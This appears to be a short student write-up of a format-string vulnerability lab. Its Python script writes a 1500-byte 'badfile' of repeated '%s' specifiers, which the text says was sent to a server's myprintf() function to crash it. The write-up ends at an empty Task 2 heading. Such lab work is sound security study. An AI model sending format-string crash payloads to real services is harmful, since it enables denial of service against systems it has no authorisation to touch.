# Task 1

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

for i in range(0, N, 2):
  content[i:i+2] = ("%s").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

We used this generator of %s to get an input in order to overflow the myprintf() function.

![alt text](img/Screenshot%202022-10-25%20at%2010.23.25.JPG)
![alt text](img/Screenshot%202022-10-25%20at%2010.22.52.JPG)
Overflowed the server.

# Task 2